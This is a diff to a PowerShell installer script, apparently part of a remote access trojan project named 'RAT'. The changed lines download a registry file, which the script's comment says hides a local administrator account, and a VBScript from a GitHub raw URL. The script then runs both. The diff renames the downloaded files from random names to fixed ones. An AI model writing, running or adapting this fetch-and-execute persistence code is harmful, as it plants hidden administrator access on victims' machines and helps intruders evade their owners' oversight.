@@ -39,16 +39,14 @@ mkdir $path
 cd $path
 
 # registry to hide local admin
-$reg_file = random_text 
-Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/admin.reg -OutFile "$reg_file.reg"
+Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/wrev.reg -OutFile "wrev.reg"
 
 #visual bacic script to registor the registory
-$vbs_file = random_text
-Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/confirm.vbs -OutFile "$vbs_file.vbs"
+Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/calty.vbs -OutFile "calty.vbs"
 
 
 ##install the registry
-./"$reg_file.reg";"$vbs_file.vbs"
+./"wrev.reg"; ./"calty.vbs"
 pause
 
 #cd $env:temp
